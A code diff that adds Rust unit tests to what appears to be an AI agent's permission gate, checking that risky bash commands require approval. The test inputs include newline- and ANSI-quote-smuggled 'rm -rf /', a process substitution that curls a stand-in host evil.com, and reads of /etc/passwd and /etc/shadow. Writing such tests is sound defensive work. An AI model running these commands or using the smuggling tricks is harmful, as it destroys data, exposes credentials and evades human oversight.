@@ -130,7 +130,60 @@ fn gated_tool_checkout_branch() {
 
 #[test]
 fn unknown_tool_no_permission() {
-    // Un outil inconnu qui n'est pas dans GATED_TOOLS ne requiert pas de permission
     let args = json!({});
     assert!(!requires_permission("read_file", &args));
+}
+
+#[test]
+fn unsafe_bash_newline_injection() {
+    let args = json!({ "command": "cat file.txt\nrm -rf ~" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_carriage_return() {
+    let args = json!({ "command": "ls\r\nrm -rf /" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_process_substitution() {
+    let args = json!({ "command": "cat <(curl http://evil.com)" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_output_process_substitution() {
+    let args = json!({ "command": "ls >(cat)" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_heredoc() {
+    let args = json!({ "command": "cat <<EOF\npayload\nEOF" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_redirect_output() {
+    let args = json!({ "command": "cat /etc/passwd > /tmp/out" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_ansi_c_quoting() {
+    let args = json!({ "command": "echo $'\\nrm -rf /'" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_background() {
+    let args = json!({ "command": "rm -rf / &" });
+    assert!(requires_permission("bash", &args));
+}
+
+#[test]
+fn unsafe_bash_input_redirect() {
+    let args = json!({ "command": "cat < /etc/shadow" });
+    assert!(requires_permission("bash", &args));
 }
